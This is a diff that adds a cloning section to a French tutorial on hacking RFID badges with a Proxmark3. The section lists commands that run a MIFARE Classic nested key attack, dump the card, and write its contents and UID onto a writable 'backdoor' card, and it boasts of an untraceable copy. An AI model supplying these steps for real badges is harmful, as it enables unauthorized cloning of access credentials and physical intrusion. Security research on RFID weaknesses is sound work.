@@ -299,6 +299,27 @@ Résultat en 2 jours garantis avec les rainbow tables et le firmware adaptés ..
     Vous pouvez chercher personnellement dans la direction du firmware `proxbrute` ;)
 
 
+### Clonage
+
+Sur le badge a cloner :
+
+```bash linenums="1"
+[usb] pm3 --> hf mf nested 1 0 A FFFFFFFFFFFF d
+[usb] pm3 --> hf mf dump
+```    
+
+Sur un badge avec Chinese Backdoor (Pour pouvoir modifier l'UID) :
+
+```bash linenums="1"
+[usb] pm3 --> hf mf restore 1 <ID du badge source>
+```  
+
+!!! tip
+    La modif de l'UID est faite automatiquement avec le firmware iceman ... sinon il suffit de faire `hf mf csetuid <ID du badge source>`
+    
+!!! success
+    Nous avons hacké notre badge et toutes ses clés, puis dupliqué celui-ci en une copie intraçable :)    
+
 ---
 
 ## Conclusion
